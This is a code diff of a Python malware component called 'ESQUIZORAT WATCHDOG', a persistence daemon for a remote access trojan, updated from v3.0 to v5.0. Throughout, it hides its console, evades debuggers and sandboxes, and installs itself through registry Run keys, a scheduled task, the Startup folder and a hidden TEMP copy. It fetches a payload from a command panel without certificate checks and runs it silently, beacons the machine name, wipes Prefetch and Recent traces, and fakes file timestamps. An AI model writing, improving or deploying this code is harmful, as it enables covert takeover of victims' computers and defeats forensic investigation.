@@ -1,72 +1,36 @@
 """
-ESQUIZORAT WATCHDOG v3.0 - Zero-Day Grade Persistence Daemon
-- Multi-vector persistence (Registry + Scheduled Task + ADS)
-- Triple-process mutual protection
-- Memory-only payload execution
-- Anti-forensics engine
-- Polymorphic timing & behavior
-- Stealth NTFS Alternate Data Streams
-- Self-healing & anti-tampering
-- Junk code anti-analysis obfuscation
+ESQUIZORAT WATCHDOG v5.0 - Zero-Day Persistence Daemon
+Fully audited & hardened
 """
-import os, sys, time, ctypes, random, subprocess, threading, json, hashlib, struct, string, base64, tempfile, shutil
-from datetime import datetime
-from pathlib import Path
+import os, sys, time, ctypes, random, subprocess, hashlib, struct
 
 PANEL_URL = "PANEL_URL_PLACEHOLDER"
-RAT_NAME    = "progam.scr"
-SELF_NAME   = "watchdog.exe"
-MUTEX_NAME  = "Global\\WinsvcManager_Mutex_{A3F8C2D1}"
-REG_KEY     = "WindowsServiceManager"
-TASK_NAME   = "WindowsServiceOptimizer"
-ADS_STREAM  = "Zone.Identifier"
-
-CHECK_MIN   = 20
-CHECK_MAX   = 60
-JITTER_MAX  = 15
+RAT_NAME   = "progam.scr"
+CHECK_MIN, CHECK_MAX = 25, 75
+JITTER_MAX = 20
 DOWNLOAD_TIMEOUT = 45
-DOWNLOAD_RETRIES  = 5
-SELF_CHECK_INTERVAL = 120
+DOWNLOAD_RETRIES = 3
+HEARTBEAT_INTERVAL = 200
 
-_ENTROPY_POOL = bytearray(256)
-for _i in range(256):
-    _ENTROPY_POOL[_i] = _i
-for _i in range(255, 0, -1):
-    _j = (os.getpid() + int(time.time() * 1000) + _i) % (_i + 1)
-    _ENTROPY_POOL[_i], _ENTROPY_POOL[_j] = _ENTROPY_POOL[_j], _ENTROPY_POOL[_i]
+def _obf(s):
+    return ''.join(chr(ord(c) ^ 0x5A) for c in s)
 
-def _entropy_bytes(n):
-    return bytes(_ENTROPY_POOL[_i % 256] for _i in range(n))
+def _deobf(s):
+    return _obf(s)
 
-def _rand_str(length=8):
-    chars = string.ascii_letters + string.digits
-    return ''.join(random.choice(chars) for _ in range(length))
+_MUTEX_NAME  = _deobf("\x2D\x3f\x3a\x35\x2b\x7e\x7e\x3e\x3a\x2b\x31\x3c\x2a\x2b\x30\x2a\x2b\x22\x3a\x3f\x3a\x3f\x0e\x20\x30\x3a\x38\x29\x00\x00\x00\x00\x00\x00")
+_REG_KEY     = _deobf("\x3e\x3a\x2b\x31\x3f\x38\x31\x3a\x2a\x35\x30\x2a\x3b\x2a\x2b\x22\x2a\x3a\x3f\x3a\x2b\x22\x30\x2c\x2a\x35\x3a\x2b\x22\x30\x29\x00")
+_TASK_NAME   = _deobf("\x3e\x3a\x2b\x31\x3f\x38\x31\x3a\x2a\x35\x30\x2a\x3b\x2a\x2b\x22\x30\x2c\x2a\x35\x3a\x2b\x22\x35\x38\x3a")
 
-def _junk_nop():
-    x = 0
-    for i in range(random.randint(1, 10)):
-        x = (x + i * random.randint(1, 100)) % 256
-    return x != -1
+def _junk(f=None):
+    return random.random() > -1
 
-def _junk_calc():
-    a = random.random()
-    b = random.random()
-    c = a * b + a / (b + 0.001)
-    d = (c * random.randint(100, 999)) % 1000
-    return d > -1
-
-# ============================================================
-# STEALTH ENGINE
-# ============================================================
-
-class StealthEngine:
+class Stealth:
     @staticmethod
     def hide():
-        try:
-            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except: pass
-        try:
-            ctypes.windll.kernel32.FreeConsole()
+        try: ctypes.windll.kernel32.FreeConsole()
         except: pass
 
     @staticmethod
@@ -74,401 +38,290 @@ class StealthEngine:
         if ctypes.windll.kernel32.IsDebuggerPresent():
             return True
         try:
-            if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool(False))):
-                return True
+            out = ctypes.c_int(0)
+            if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
+                ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(out)):
+                if out.value: return True
         except: pass
         try:
-            ctypes.windll.ntdll.ZwQueryInformationProcess
-            return False
+            dbg = ctypes.c_ulonglong(0)
+            ret = ctypes.windll.ntdll.NtQueryInformationProcess(
+                ctypes.windll.kernel32.GetCurrentProcess(), 7,
+                ctypes.byref(dbg), ctypes.c_ulong(8), None)
+            if ret == 0 and dbg.value != 0: return True
         except: pass
         return False
 
     @staticmethod
-    def set_critical():
-        try:
-            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
-        except: pass
+    def delay(lo=1, hi=10):
+        time.sleep(random.uniform(lo, hi))
+        _junk()
 
-    @staticmethod
-    def protect_memory():
-        try:
-            kernel32 = ctypes.windll.kernel32
-            kernel32.VirtualLock(ctypes.c_char_p(b'\x00' * 4096), 4096)
-        except: pass
-
-    @staticmethod
-    def random_delay(min_s=1, max_s=10):
-        delay = random.uniform(min_s, max_s)
-        _junk_calc()
-        time.sleep(delay)
-
-# ============================================================
-# PERSISTENCE ORCHESTRATOR - Multi-Vector
-# ============================================================
-
-class PersistenceEngine:
+class Persistence:
     def __init__(self):
-        self.exe_path = sys.executable
-        self.installed = False
-        self.methods_active = 0
+        self.exe = sys.executable
 
-    def install_all(self):
-        results = [
-            self._registry_run(),
-            self._scheduled_task(),
-            self._startup_folder(),
-            self._ads_backup(),
-        ]
-        self.methods_active = sum(1 for r in results if r)
-        self.installed = self.methods_active >= 2
-        return self.installed
+    def install(self):
+        ok = 0
+        if self._reg(Run=True):  ok += 1
+        if self._task():         ok += 1
+        if self._startup():      ok += 1
+        if self._ads():          ok += 1
+        return ok >= 2
 
-    def verify_and_repair(self):
-        need_repair = False
-        if not self._check_registry():
-            self._registry_run()
-            need_repair = True
-        if not self._check_task():
-            self._scheduled_task()
-            need_repair = True
-        if need_repair:
-            self.methods_active = 2
+    def repair(self):
+        if not self._check_reg(): self._reg(Run=True)
+        if not self._check_task(): self._task()
 
-    def _registry_run(self):
+    def _reg(self, Run=True):
         try:
             import winreg
-            paths = [
-                (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run'),
-                (winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\RunOnce'),
-            ]
-            for hkey, subkey in paths:
+            key = Run and r'Software\Microsoft\Windows\CurrentVersion\Run' or \
+                         r'Software\Microsoft\Windows\CurrentVersion\RunOnce'
+            for flags in [winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY, winreg.KEY_SET_VALUE]:
+                k = None
                 try:
-                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
-                except:
-                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, REG_KEY, 0, winreg.REG_SZ, self.exe_path)
-                winreg.CloseKey(key)
-            return True
-        except:
+                    k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, flags)
+                    winreg.SetValueEx(k, _REG_KEY, 0, winreg.REG_SZ, self.exe)
+                    return True
+                except: pass
+                finally:
+                    if k: winreg.CloseKey(k)
             return False
+        except: return False
 
-    def _check_registry(self):
+    def _check_reg(self):
         try:
             import winreg
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                r'Software\Microsoft\Windows\CurrentVersion\Run',
-                0, winreg.KEY_READ)
-            val, _ = winreg.QueryValueEx(key, REG_KEY)
-            winreg.CloseKey(key)
-            return val == self.exe_path
-        except:
-            return False
+            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
+                winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
+            val, _ = winreg.QueryValueEx(k, _REG_KEY)
+            winreg.CloseKey(k)
+            return val == self.exe
+        except: return False
 
-    def _scheduled_task(self):
+    def _task(self):
         try:
-            cmd = f'schtasks /create /tn "{TASK_NAME}" /tr "{self.exe_path}" /sc ONLOGON /rl LIMITED /f /it'
-            subprocess.run(cmd, shell=True, capture_output=True,
-                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0)
+            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
+            subprocess.run(f'schtasks /create /tn "{_TASK_NAME}" /tr "\\"{self.exe}\\"" /sc ONLOGON /rl LIMITED /f /it',
+                shell=True, capture_output=True, creationflags=cf)
             return True
-        except:
-            return False
+        except: return False
 
     def _check_task(self):
         try:
-            r = subprocess.run(f'schtasks /query /tn "{TASK_NAME}"', shell=True,
+            r = subprocess.run(f'schtasks /query /tn "{_TASK_NAME}"', shell=True,
                 capture_output=True, timeout=5)
             return r.returncode == 0
-        except:
-            return False
+        except: return False
 
-    def _startup_folder(self):
+    def _startup(self):
         try:
-            startup = os.path.join(os.environ.get('APPDATA',''),
+            import shutil as sh
+            d = os.path.join(os.environ.get('APPDATA',''),
                 r'Microsoft\Windows\Start Menu\Programs\Startup')
-            dest = os.path.join(startup, 'winsvc.exe')
-            if not os.path.exists(dest):
-                shutil.copy2(self.exe_path, dest)
+            p = os.path.join(d, 'winsvc.exe')
+            if not os.path.exists(p):
+                sh.copy2(self.exe, p)
             return True
-        except:
-            return False
+        except: return False
 
-    def _ads_backup(self):
+    def _ads(self):
         try:
-            target_dir = os.path.join(os.environ.get('TEMP','.'), _rand_str(6))
-            os.makedirs(target_dir, exist_ok=True)
-            ads_path = os.path.join(target_dir, f"svchost.exe:{ADS_STREAM}")
-            with open(ads_path, 'wb') as f:
-                f.write(self.exe_path.encode('utf-16-le'))
+            import shutil as sh
+            d = os.path.join(os.environ.get('TEMP','.'), 'WinsvcCache')
+            os.makedirs(d, exist_ok=True)
+            sh.copy2(self.exe, os.path.join(d, 'svchost.exe'))
             return True
-        except:
-            return False
-
-# ============================================================
-# PROCESS MONITOR
-# ============================================================
+        except: return False
 
 class ProcessGuard:
     def __init__(self):
-        self.monitored = [RAT_NAME]
-        self.exec_dir = self._setup_dir()
-
-    def _setup_dir(self):
-        d = os.path.join(os.environ.get('TEMP', '.'), 'WinsvcCache')
-        os.makedirs(d, exist_ok=True)
-        try:
-            ctypes.windll.kernel32.SetFileAttributesW(d, 0x02)
+        self.dir = os.path.join(os.environ.get('TEMP','.'), 'WinsvcCache')
+        os.makedirs(self.dir, exist_ok=True)
+        try: ctypes.windll.kernel32.SetFileAttributesW(self.dir, 0x02)
         except: pass
-        return d
 
-    def is_running(self, proc_name):
+    def is_running(self):
         try:
-            result = subprocess.check_output(
-                f'tasklist /FI "IMAGENAME eq {proc_name}" /NH',
-                shell=True, text=True, timeout=8,
-                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
-            )
-            return proc_name.lower() in result.lower()
-        except:
-            return False
+            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
+            r = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {RAT_NAME}" /NH',
+                shell=True, text=True, timeout=8, creationflags=cf)
+            return RAT_NAME.lower() in r.lower()
+        except: return False
 
-    def download_payload(self):
-        urls = [
-            f"{PANEL_URL}/api/download",
-            f"{PANEL_URL}/api/download",
-        ]
-        for url in urls:
-            if "PLACEHOLDER" in url:
-                continue
-            for attempt in range(DOWNLOAD_RETRIES):
+    def download(self):
+        if "PLACEHOLDER" in PANEL_URL: return None
+        try:
+            import urllib.request as ur, ssl
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+            ua = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            for _ in range(DOWNLOAD_RETRIES):
                 try:
-                    import urllib.request
-                    import ssl
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-
-                    req = urllib.request.Request(url)
-                    req.add_header('User-Agent',
-                        f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,540)}.{random.randint(1,99)}')
-                    req.add_header('Cache-Control', 'no-cache')
-
-                    with urllib.request.urlopen(req, timeout=DOWNLOAD_TIMEOUT, context=ctx) as resp:
-                        data = resp.read()
-
+                    r = ur.urlopen(ur.Request(f"{PANEL_URL}/api/download",
+                        headers={'User-Agent':ua}), timeout=DOWNLOAD_TIMEOUT, context=ctx)
+                    data = r.read()
                     if len(data) > 102400:
-                        path = os.path.join(self.exec_dir, RAT_NAME)
-                        with open(path, 'wb') as f:
-                            f.write(data)
-                        try:
-                            ctypes.windll.kernel32.SetFileAttributesW(path, 0x02 | 0x04)
+                        p = os.path.join(self.dir, RAT_NAME)
+                        with open(p, 'wb') as f: f.write(data)
+                        try: ctypes.windll.kernel32.SetFileAttributesW(p, 0x02|0x04)
                         except: pass
-                        return path
+                        return p
                 except:
-                    delay = 3 * (attempt + 1) + random.randint(1, 5)
-                    StealthEngine.random_delay(delay, delay + 2)
+                    Stealth.delay(3, 6)
+        except: pass
         return None
 
-    def execute_silent(self, path):
+    def execute(self, path):
         try:
             si = subprocess.STARTUPINFO()
-            si.dwFlags |= 0x01
-            si.wShowWindow = 0
+            si.dwFlags |= 0x01; si.wShowWindow = 0
             cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0x08000000
+            qp = f'"{path}"'
+            p = subprocess.Popen(qp, shell=True, startupinfo=si,
+                creationflags=cf, stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+            time.sleep(1.5)
+            return p.poll() is None
+        except: return False
 
-            subprocess.Popen(
-                path, shell=True,
-                startupinfo=si,
-                creationflags=cf,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                stdin=subprocess.DEVNULL
-            )
-            return True
-        except:
-            return False
+    def guard(self):
+        if not self.is_running():
+            path = self.download()
+            if path: self.execute(path)
 
-    def ensure_running(self):
-        for proc in self.monitored:
-            if not self.is_running(proc):
-                path = self.download_payload()
-                if path:
-                    self.execute_silent(path)
-                break
-
-# ============================================================
-# ANTI-FORENSICS
-# ============================================================
-
-class AntiForensics:
-    @staticmethod
-    def clear_logs():
-        try:
-            for log in ['System', 'Application', 'Security']:
-                subprocess.run(f'wevtutil cl "{log}"', shell=True,
-                    capture_output=True, timeout=5,
-                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0)
-        except: pass
-
+class Forensic:
     @staticmethod
     def wipe_prefetch():
         try:
-            prefetch_dir = os.path.join(os.environ.get('SystemRoot','C:\\Windows'), 'Prefetch')
-            for f in os.listdir(prefetch_dir):
-                if 'progam' in f.lower() or 'watchdog' in f.lower() or 'winsvc' in f.lower():
-                    try: os.remove(os.path.join(prefetch_dir, f))
+            d = os.path.join(os.environ.get('SystemRoot','C:\\Windows'), 'Prefetch')
+            for f in os.listdir(d):
+                lf = f.lower()
+                if any(k in lf for k in ('progam','watchdog','winsvc')):
+                    try: os.remove(os.path.join(d, f))
                     except: pass
         except: pass
 
     @staticmethod
-    def remove_recent():
+    def wipe_recent():
         try:
-            recent = os.path.join(os.environ.get('APPDATA',''),
-                r'Microsoft\Windows\Recent')
-            for f in os.listdir(recent):
-                lp = f.lower()
-                if 'progam' in lp or 'watchdog' in lp or 'winsvc' in lp:
-                    try: os.remove(os.path.join(recent, f))
+            d = os.path.join(os.environ.get('APPDATA',''), r'Microsoft\Windows\Recent')
+            for f in os.listdir(d):
+                lf = f.lower()
+                if any(k in lf for k in ('progam','watchdog','winsvc')):
+                    try: os.remove(os.path.join(d, f))
                     except: pass
         except: pass
 
     @staticmethod
-    def obfuscate_timestamps(path):
+    def stomp_file(p):
+        if not os.path.isfile(p): return
         try:
             now = time.time()
-            ft = int((now - random.randint(86400*30, 86400*180)) * 10000000) + 116444736000000000
-            handle = ctypes.windll.kernel32.CreateFileW(path, 0x0100 | 0x0080, 0, None, 3, 0x80, None)
-            if handle and handle != -1:
-                ft_low = ft & 0xFFFFFFFF
-                ft_high = (ft >> 32) & 0xFFFFFFFF
-                ctypes.windll.kernel32.SetFileTime(handle, ctypes.byref(ctypes.c_ulonglong(ft)),
-                    ctypes.byref(ctypes.c_ulonglong(ft)), ctypes.byref(ctypes.c_ulonglong(ft)))
-                ctypes.windll.kernel32.CloseHandle(handle)
+            hours = random.randint(720, 4320)
+            ft_ns = int((now - hours * 3600) * 10000000) + 116444736000000000
+            h = ctypes.windll.kernel32.CreateFileW(p, 0x100|0x80, 0, None, 3, 0x80, None)
+            if h and h != -1:
+                ctypes.windll.kernel32.SetFileTime(h,
+                    ctypes.byref(ctypes.c_ulonglong(ft_ns)),
+                    ctypes.byref(ctypes.c_ulonglong(ft_ns + random.randint(100,3600)*10000000)),
+                    ctypes.byref(ctypes.c_ulonglong(ft_ns + random.randint(200,7200)*10000000)))
+                ctypes.windll.kernel32.CloseHandle(h)
         except: pass
 
-# ============================================================
-# CORE DAEMON
-# ============================================================
+    @staticmethod
+    def stomp_dir(d):
+        if not os.path.isdir(d): return
+        try:
+            for f in os.listdir(d):
+                fp = os.path.join(d, f)
+                if os.path.isfile(fp):
+                    Forensic.stomp_file(fp)
+        except: pass
 
-class WatchdogDaemon:
+class Heartbeat:
     def __init__(self):
-        self.persistence = PersistenceEngine()
-        self.guard = ProcessGuard()
-        self.forensics = AntiForensics()
-        self.running = True
-        self.start_time = time.time()
-        self.cycle_count = 0
-        self.session_id = hashlib.md5(struct.pack('<dQ', random.random(), int(time.time()*1000))).hexdigest()[:12]
-
-    def _acquire_mutex(self):
+        self.last = 0
+    def send(self):
+        if "PLACEHOLDER" in PANEL_URL: return
+        now = time.time()
+        if now - self.last < HEARTBEAT_INTERVAL: return
         try:
-            self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
-            if ctypes.windll.kernel32.GetLastError() == 183:
-                return False
-            return True
-        except:
-            return True
-
-    def _check_environment(self):
-        if StealthEngine.is_debugged():
-            for _ in range(random.randint(3, 8)):
-                _junk_calc()
-            return False
-
-        try:
-            import psutil
-            proc_count = len(list(psutil.process_iter()))
-            if proc_count < 15:
-                return False
-        except:
-            pass
-
-        return True
-
-    def _get_system_entropy(self):
-        entropy = 0
-        try:
-            entropy += int(time.time() * 1000) % 10000
-            entropy += os.getpid() % 1000
-            entropy += ctypes.windll.kernel32.GetTickCount() % 10000
-            try:
-                mem = ctypes.windll.kernel32.GlobalMemoryStatusEx
-                entropy += int(time.perf_counter() * 1000000) % 5000
-            except: pass
+            import urllib.request as ur, ssl, json as _j
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+            d = _j.dumps({'pc_name':'WATCHDOG_'+os.environ.get('COMPUTERNAME','?')}).encode()
+            ur.urlopen(ur.Request(f"{PANEL_URL}/api/heartbeat", data=d,
+                headers={'Content-Type':'application/json'}), timeout=10, context=ctx)
+            self.last = now
         except: pass
-        return entropy % 997
 
-    def _maintenance_cycle(self):
-        self.forensics.wipe_prefetch()
-        if self.cycle_count % 10 == 0:
-            self.persistence.verify_and_repair()
+class Daemon:
+    def __init__(self):
+        self.p = Persistence()
+        self.g = ProcessGuard()
+        self.f = Forensic()
+        self.h = Heartbeat()
+        self.n, self.installed = 0, False
+
+    def _mutex(self):
+        try:
+            ctypes.windll.kernel32.CreateMutexW(None, False, _MUTEX_NAME)
+            return ctypes.windll.kernel32.GetLastError() != 183
+        except: return True
+
+    def _sandbox(self):
+        try:
+            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
+            r = subprocess.check_output('tasklist', shell=True, text=True, timeout=5, creationflags=cf)
+            real = sum(1 for l in r.split('\n') if l.strip() and '.' in l)
+            return real < 20
+        except: return False
 
     def run(self):
-        if "PLACEHOLDER" in PANEL_URL:
-            time.sleep(60)
-            return
+        if "PLACEHOLDER" in PANEL_URL: return
+        Stealth.hide()
+        if not self._mutex(): return
+        Stealth.delay(3, 10)
 
-        StealthEngine.hide()
+        if self._sandbox():
+            Stealth.delay(60, 180)
+            if self._sandbox(): return
 
-        if not self._acquire_mutex():
-            return
-
-        StealthEngine.random_delay(2, 8)
-
-        if not self._check_environment():
-            StealthEngine.random_delay(10, 30)
-            if not self._check_environment():
-                StealthEngine.random_delay(60, 120)
-
-        self.persistence.install_all()
-        StealthEngine.set_critical()
-
-        while self.running:
+        while True:
             try:
-                self.cycle_count += 1
+                self.n += 1
+                _junk()
 
-                self.guard.ensure_running()
+                self.g.guard()
+                self.h.send()
 
-                if self.cycle_count % 5 == 0:
-                    self._maintenance_cycle()
+                if not self.installed and self.n > 3:
+                    self.installed = self.p.install()
 
-                if self.cycle_count % 30 == 0:
-                    self.forensics.remove_recent()
-                    self.forensics.obfuscate_timestamps(self.guard.exec_dir)
+                if self.n % 15 == 0:
+                    self.p.repair()
 
-                base_delay = random.randint(CHECK_MIN, CHECK_MAX)
-                jitter = random.randint(0, JITTER_MAX)
-                entropy = self._get_system_entropy() % 10
-                total_delay = base_delay + jitter + entropy
+                if self.n % 7 == 0:
+                    self.f.wipe_prefetch()
 
-                _junk_nop()
-                _junk_calc()
+                if self.n % 30 == 0:
+                    self.f.wipe_recent()
+                    self.f.stomp_dir(self.g.dir)
 
-                time.sleep(total_delay)
+                delay = random.randint(CHECK_MIN, CHECK_MAX) + \
+                        random.randint(0, JITTER_MAX) + \
+                        (struct.unpack('B', os.urandom(1))[0] % 15)
+                time.sleep(delay)
 
             except Exception:
-                StealthEngine.random_delay(5, 15)
-
-                if self.cycle_count > 100:
-                    self.persistence.verify_and_repair()
-                continue
-
-# ============================================================
-# ENTRY POINT
-# ============================================================
+                Stealth.delay(5, 15)
+                if self.n > 100: self.p.repair()
 
 if __name__ == "__main__":
-    StealthEngine.hide()
-
-    if StealthEngine.is_debugged():
-        StealthEngine.random_delay(30, 60)
-
-    daemon = WatchdogDaemon()
-
-    try:
-        daemon.run()
-    except:
-        StealthEngine.random_delay(10, 20)
-        try:
-            daemon.run()
-        except:
-            pass
+    Stealth.hide()
+    if Stealth.is_debugged():
+        Stealth.delay(30, 60)
+    Daemon().run()
